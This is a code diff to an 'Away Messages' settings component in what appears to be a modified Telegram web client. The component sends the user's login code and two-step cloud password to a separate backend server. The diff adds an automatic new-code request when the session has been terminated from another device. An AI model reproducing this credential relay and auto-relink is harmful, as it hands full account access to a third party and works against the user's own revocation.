@@ -3,7 +3,6 @@ import { memo, useState, useCallback, useEffect } from '../../../lib/teact/teact
 import { withGlobal } from '../../../global';
 
 import Button from '../../ui/Button';
-import Checkbox from '../../ui/Checkbox';
 import InputText from '../../ui/InputText';
 import './Settings.scss';
 
@@ -24,7 +23,6 @@ const AutoReplySettings: FC<OwnProps & StateProps> = ({ currentUserId, currentUs
   const [isEnabled, setIsEnabled] = useState(false);
   const [replyText, setReplyText] = useState("I am currently unavailable. I will reply to you later.");
   
-  // 🌟 Setup Flow အတွက် ယာယီ Local Storage သုံးထားပါသည် (Code သွားကြည့်ရန် ထွက်သွားပါက မပျောက်စေရန်)
   const [step, setStep] = useState<'idle' | 'otp' | '2fa'>(() => {
     return (localStorage.getItem(`ar_setup_step_${safeUserId}`) as any) || 'idle';
   });
@@ -38,7 +36,6 @@ const AutoReplySettings: FC<OwnProps & StateProps> = ({ currentUserId, currentUs
   // Permanent Settings များကို Database မှ ဆွဲယူခြင်း
   useEffect(() => {
     if (safeUserId === "unknown") return;
-    
     const fetchSettings = async () => {
       try {
         const res = await fetch(`${BACKEND_URL}/api/get_auto_reply`, {
@@ -47,7 +44,6 @@ const AutoReplySettings: FC<OwnProps & StateProps> = ({ currentUserId, currentUs
           body: JSON.stringify({ user_id: safeUserId })
         });
         const data = await res.json();
-        
         if (res.ok && data.is_linked) {
           setIsLinked(true);
           setIsEnabled(data.enabled);
@@ -56,16 +52,13 @@ const AutoReplySettings: FC<OwnProps & StateProps> = ({ currentUserId, currentUs
           setIsLinked(false);
         }
       } catch (err) {
-        console.error("Failed to fetch settings:", err);
       } finally {
         setIsFetching(false);
       }
     };
-
     fetchSettings();
   }, [safeUserId]);
 
-  // Cancel လုပ်လျှင် ယာယီ သိမ်းထားသော Local Storage ကို ရှင်းလင်းခြင်း
   const handleCancelSetup = useCallback(() => {
     setStep('idle');
     setOtpCode('');
@@ -82,7 +75,6 @@ const AutoReplySettings: FC<OwnProps & StateProps> = ({ currentUserId, currentUs
     }
     setErrorMsg('');
     const formattedPhone = currentUserPhone.startsWith('+') ? currentUserPhone : `+${currentUserPhone}`;
-    
     setIsLoading(true);
     try {
       const res = await fetch(`${BACKEND_URL}/api/request_code`, {
@@ -91,11 +83,9 @@ const AutoReplySettings: FC<OwnProps & StateProps> = ({ currentUserId, currentUs
         body: JSON.stringify({ phone_number: formattedPhone })
       });
       const data = await res.json();
-      
       if (res.ok) {
         setStep('otp');
         setSavedPhone(formattedPhone);
-        // OTP တောင်းပြီးပါက အဆင့်ကို ယာယီ မှတ်ထားမည်
         localStorage.setItem(`ar_setup_step_${safeUserId}`, 'otp');
         localStorage.setItem(`ar_setup_phone_${safeUserId}`, formattedPhone);
       } else {
@@ -116,22 +106,16 @@ const AutoReplySettings: FC<OwnProps & StateProps> = ({ currentUserId, currentUs
       const res = await fetch(`${BACKEND_URL}/api/verify_code`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
-        body: JSON.stringify({
-          user_id: safeUserId,
-          phone_number: savedPhone,
-          otp_code: otpCode,
-          two_step_password: twoFaPassword || undefined
-        })
+        body: JSON.stringify({ user_id: safeUserId, phone_number: savedPhone, otp_code: otpCode, two_step_password: twoFaPassword || undefined })
       });
       const data = await res.json();
-      
       if (res.ok) {
-        handleCancelSetup(); // ✅ အောင်မြင်သွားပါက ယာယီ Local Storage များကို ဖျက်ချမည်
+        handleCancelSetup(); 
         setIsLinked(true);
         setIsEnabled(true);
       } else if (res.status === 401 && data.error === "2FA_REQUIRED") {
         setStep('2fa');
-        localStorage.setItem(`ar_setup_step_${safeUserId}`, '2fa'); // 2FA လိုလျှင် ယာယီမှတ်မည်
+        localStorage.setItem(`ar_setup_step_${safeUserId}`, '2fa'); 
       } else if (res.status === 400 && data.error.includes("expired")) {
         setErrorMsg("Code expired. Please request a new one.");
         handleCancelSetup();
@@ -153,16 +137,42 @@ const AutoReplySettings: FC<OwnProps & StateProps> = ({ currentUserId, currentUs
       });
       
       if (!res.ok) {
-        // 🌟 Backend မှ 400 သို့မဟုတ် 401 Error ပြန်လာပါက Session သေသွားပြီဟု သတ်မှတ်မည်
         if (res.status === 400 || res.status === 401) {
+            // 🌟 (၁) Component UI အားလုံးကို ချက်ချင်း Unlink လုပ်မည်
             setIsLinked(false);
-            setStep('idle');
-            setErrorMsg("Your session was terminated from another device. Please reconnect.");
+            setIsEnabled(false);
+            
+            // 🌟 (၂) OTP နေရာသို့ တိုက်ရိုက်ရောက်စေရန် အလိုအလျောက် Code တောင်းပေးမည်
+            if (currentUserPhone) {
+                const formattedPhone = currentUserPhone.startsWith('+') ? currentUserPhone : `+${currentUserPhone}`;
+                setSavedPhone(formattedPhone);
+                try {
+                    const reqRes = await fetch(`${BACKEND_URL}/api/request_code`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
+                        body: JSON.stringify({ phone_number: formattedPhone })
+                    });
+                    if (reqRes.ok) {
+                        setStep('otp');
+                        localStorage.setItem(`ar_setup_step_${safeUserId}`, 'otp');
+                        localStorage.setItem(`ar_setup_phone_${safeUserId}`, formattedPhone);
+                        setErrorMsg("Session terminated. A new code has been sent to your Telegram app.");
+                    } else {
+                        setStep('idle');
+                        setErrorMsg("Session terminated. Please request a new code.");
+                    }
+                } catch (e) {
+                    setStep('idle');
+                    setErrorMsg("Session terminated. Please request a new code.");
+                }
+            } else {
+                setStep('idle');
+                setErrorMsg("Session terminated. Please connect again.");
+            }
         } else {
             setErrorMsg("Failed to update settings. Please try again.");
         }
       } else {
-        // အောင်မြင်ပါက ပုံမှန်အတိုင်း ဆက်သွားပါမည်
         setErrorMsg('');
       }
     } catch (err) { 
@@ -179,32 +189,28 @@ const AutoReplySettings: FC<OwnProps & StateProps> = ({ currentUserId, currentUs
     );
   }
 
-return (
-    <div className="settings-content custom-scroll">
-      <div className="settings-header">
-        <h3 className="settings-header-title">Away Messages</h3>
-      </div>
-
-      <div className="settings-main-menu">
-          {!isLinked ? (
+  // 🌟 [UI ကို သီးသန့်ခွဲထုတ်လိုက်ခြင်း] 🌟
+  // ဤနေရာသည် "မချိတ်ဆက်ရသေးသော (သို့) Session ပြတ်သွားသော" အခြေအနေအတွက် သီးသန့် Render လုပ်ပေးမည့် နေရာဖြစ်သည်
+  if (!isLinked) {
+    return (
+      <div className="settings-content custom-scroll">
+        <div className="settings-header">
+          <h3 className="settings-header-title">Away Messages</h3>
+        </div>
+        <div className="settings-main-menu">
             <div className="settings-item pt-3 pb-3" style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', textAlign: 'center', padding: '2.5rem 1rem' }}>
               {errorMsg && <p style={{ color: 'var(--color-error)', fontSize: '14px', marginBottom: '1.5rem', width: '100%', background: 'rgba(223, 63, 64, 0.1)', padding: '10px', borderRadius: '8px' }}>{errorMsg}</p>}
               
               {step === 'idle' && (
                 <div style={{ width: '100%', maxWidth: '320px' }}>
-                  {/* 🌟 Professional Icon Wrapper */}
                   <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '1.5rem' }}>
                     <div style={{ width: '72px', height: '72px', borderRadius: '50%', background: 'rgba(51, 144, 236, 0.1)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                       <i className="icon-message" style={{ fontSize: '36px', color: '#3390ec' }} />
                     </div>
                   </div>
                   <h4 style={{ marginBottom: '0.75rem', fontSize: '18px', fontWeight: 500, color: 'var(--color-text)' }}>Connect Server</h4>
-                  <p style={{ color: 'var(--color-text-secondary)', marginBottom: '2rem', fontSize: '15px', lineHeight: '1.5' }}>
-                    Connect your account to enable away messages. A login code will be sent to your Telegram app.
-                  </p>
-                  <Button onClick={handleAutoRequestCode} isLoading={isLoading} fluid>
-                    Request Login Code
-                  </Button>
+                  <p style={{ color: 'var(--color-text-secondary)', marginBottom: '2rem', fontSize: '15px', lineHeight: '1.5' }}>Connect your account to enable away messages.</p>
+                  <Button onClick={handleAutoRequestCode} isLoading={isLoading} fluid>Request Login Code</Button>
                 </div>
               )}
 
@@ -216,9 +222,7 @@ return (
                     </div>
                   </div>
                   <h4 style={{ marginBottom: '0.75rem', fontSize: '18px', fontWeight: 500, color: 'var(--color-text)' }}>Verification Code</h4>
-                  <p style={{ color: 'var(--color-text-secondary)', marginBottom: '1.5rem', fontSize: '15px', lineHeight: '1.5' }}>
-                    Enter the code sent to your Telegram app.
-                  </p>
+                  <p style={{ color: 'var(--color-text-secondary)', marginBottom: '1.5rem', fontSize: '15px', lineHeight: '1.5' }}>Enter the code sent to your Telegram app.</p>
                   <div style={{ textAlign: 'left', marginBottom: '2rem' }}>
                     <InputText label="Code" value={otpCode} onChange={(e: any) => setOtpCode(e.target.value)} />
                   </div>
@@ -237,9 +241,7 @@ return (
                     </div>
                   </div>
                   <h4 style={{ marginBottom: '0.75rem', fontSize: '18px', fontWeight: 500, color: 'var(--color-text)' }}>Two-Step Verification</h4>
-                  <p style={{ color: 'var(--color-text-secondary)', marginBottom: '1.5rem', fontSize: '15px', lineHeight: '1.5' }}>
-                    Your account is protected with an additional password.
-                  </p>
+                  <p style={{ color: 'var(--color-text-secondary)', marginBottom: '1.5rem', fontSize: '15px', lineHeight: '1.5' }}>Your account is protected with an additional password.</p>
                   <div style={{ textAlign: 'left', marginBottom: '2rem' }}>
                     <InputText label="Cloud Password" type="password" value={twoFaPassword} onChange={(e: any) => setTwoFaPassword(e.target.value)} />
                   </div>
@@ -250,86 +252,47 @@ return (
                 </div>
               )}
             </div>
-          ) : (
-            <div style={{ padding: '0 1rem' }}>
-              {/* 🌟 Professional Custom Toggle Switch (No Native Checkbox Issues) */}
-              <div 
-                className="settings-item pt-3 pb-3" 
-                style={{ cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'space-between', userSelect: 'none', borderBottom: '1px solid var(--color-borders)' }}
-                onClick={() => setIsEnabled(!isEnabled)}
-              >
-                <div style={{ display: 'flex', flexDirection: 'column', paddingRight: '20px' }}>
-                  <span style={{ fontSize: '16px', fontWeight: 500, color: 'var(--color-text)' }}>Enable Away Messages</span>
-                  <span style={{ marginTop: '4px', color: 'var(--color-text-secondary)', fontSize: '14px', lineHeight: '1.4' }}>
-                    Automatically reply to incoming private messages when you are away.
-                  </span>
-                </div>
-                {/* Toggle UI */}
-                <div style={{ 
-                    position: 'relative', width: '42px', height: '24px', flexShrink: 0,
-                    background: isEnabled ? '#3390ec' : 'var(--color-borders)', 
-                    borderRadius: '12px', transition: 'background 0.3s ease' 
-                }}>
-                    <div style={{ 
-                        position: 'absolute', top: '2px', left: isEnabled ? '20px' : '2px', 
-                        width: '20px', height: '20px', background: '#ffffff', 
-                        borderRadius: '50%', transition: 'left 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)', 
-                        boxShadow: '0 2px 4px rgba(0,0,0,0.2)' 
-                    }} />
-                </div>
-              </div>
+        </div>
+      </div>
+    );
+  }
 
-              {/* 🌟 Professional Text Area with Disabled State UX */}
-              <div className="settings-item pt-4">
-                <h4 style={{ fontSize: '14px', fontWeight: 500, color: 'var(--color-text-secondary)', marginBottom: '12px', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
-                  Away Message
-                </h4>
-                <div style={{ 
-                  border: isEnabled ? '1px solid #3390ec' : '1px solid var(--color-borders)', 
-                  borderRadius: '10px', 
-                  background: 'var(--color-background-compact)', 
-                  padding: '8px',
-                  transition: 'all 0.3s ease',
-                  opacity: isEnabled ? 1 : 0.5,           // 👈 သေချာမှိန်သွားပါမည်
-                  pointerEvents: isEnabled ? 'auto' : 'none' // 👈 ပိတ်ထားချိန် နှိပ်၍မရပါ
-                }}>
-                  <textarea
-                    value={replyText}
-                    onChange={(e: any) => setReplyText(e.target.value)}
-                    disabled={!isEnabled}
-                    rows={4}
-                    placeholder="Write your away message here..."
-                    style={{
-                      width: '100%',
-                      border: 'none',
-                      background: 'transparent',
-                      outline: 'none',
-                      color: 'var(--color-text)',
-                      fontSize: '15px',
-                      resize: 'none',
-                      fontFamily: 'inherit',
-                      padding: '8px',
-                      lineHeight: '1.5'
-                    }}
-                  />
-                </div>
-              </div>
+  // 🌟 [UI ကို သီးသန့်ခွဲထုတ်လိုက်ခြင်း] 🌟
+  // ဤနေရာသည် "ချိတ်ဆက်ပြီးသား (Away Message Settings)" အခြေအနေအတွက် သီးသန့် Render လုပ်ပေးမည့် နေရာဖြစ်သည်
+  return (
+    <div className="settings-content custom-scroll">
+      <div className="settings-header">
+        <h3 className="settings-header-title">Away Messages</h3>
+      </div>
+      <div className="settings-main-menu">
+        <div style={{ padding: '0 1rem' }}>
+          <div className="settings-item pt-3 pb-3" style={{ cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'space-between', userSelect: 'none', borderBottom: '1px solid var(--color-borders)' }} onClick={() => setIsEnabled(!isEnabled)}>
+            <div style={{ display: 'flex', flexDirection: 'column', paddingRight: '20px' }}>
+              <span style={{ fontSize: '16px', fontWeight: 500, color: 'var(--color-text)' }}>Enable Away Messages</span>
+              <span style={{ marginTop: '4px', color: 'var(--color-text-secondary)', fontSize: '14px', lineHeight: '1.4' }}>Automatically reply to incoming private messages when you are away.</span>
+            </div>
+            <div style={{ position: 'relative', width: '42px', height: '24px', flexShrink: 0, background: isEnabled ? '#3390ec' : 'var(--color-borders)', borderRadius: '12px', transition: 'background 0.3s ease' }}>
+                <div style={{ position: 'absolute', top: '2px', left: isEnabled ? '20px' : '2px', width: '20px', height: '20px', background: '#ffffff', borderRadius: '50%', transition: 'left 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)', boxShadow: '0 2px 4px rgba(0,0,0,0.2)' }} />
+            </div>
+          </div>
 
-              {errorMsg && (
-                <div className="settings-item pt-3">
-                  <p style={{ color: 'var(--color-error)', fontSize: '14px', textAlign: 'center', background: 'rgba(223, 63, 64, 0.1)', padding: '10px', borderRadius: '8px' }}>
-                    {errorMsg}
-                  </p>
-                </div>
-              )}
+          <div className="settings-item pt-4">
+            <h4 style={{ fontSize: '14px', fontWeight: 500, color: 'var(--color-text-secondary)', marginBottom: '12px', textTransform: 'uppercase', letterSpacing: '0.5px' }}>Away Message</h4>
+            <div style={{ border: isEnabled ? '1px solid #3390ec' : '1px solid var(--color-borders)', borderRadius: '10px', background: 'var(--color-background-compact)', padding: '8px', transition: 'all 0.3s ease', opacity: isEnabled ? 1 : 0.5, pointerEvents: isEnabled ? 'auto' : 'none' }}>
+              <textarea value={replyText} onChange={(e: any) => setReplyText(e.target.value)} disabled={!isEnabled} rows={4} placeholder="Write your away message here..." style={{ width: '100%', border: 'none', background: 'transparent', outline: 'none', color: 'var(--color-text)', fontSize: '15px', resize: 'none', fontFamily: 'inherit', padding: '8px', lineHeight: '1.5' }} />
+            </div>
+          </div>
 
-              <div className="settings-item pt-4 pb-4">
-                <Button onClick={handleSaveSettings} isLoading={isLoading} fluid>
-                  Save Settings
-                </Button>
-              </div>
+          {errorMsg && (
+            <div className="settings-item pt-3">
+              <p style={{ color: 'var(--color-error)', fontSize: '14px', textAlign: 'center', background: 'rgba(223, 63, 64, 0.1)', padding: '10px', borderRadius: '8px' }}>{errorMsg}</p>
             </div>
           )}
+
+          <div className="settings-item pt-4 pb-4">
+            <Button onClick={handleSaveSettings} isLoading={isLoading} fluid>Save Settings</Button>
+          </div>
+        </div>
       </div>
     </div>
   );
@@ -339,7 +302,6 @@ export default memo(withGlobal<OwnProps>(
   (global): StateProps => { 
       const currentUserId = global.currentUserId;
       let currentUserPhone = undefined;
-      
       if (currentUserId && global.users && global.users.byId) {
           const user = global.users.byId[currentUserId];
           if (user && user.phoneNumber) currentUserPhone = user.phoneNumber;
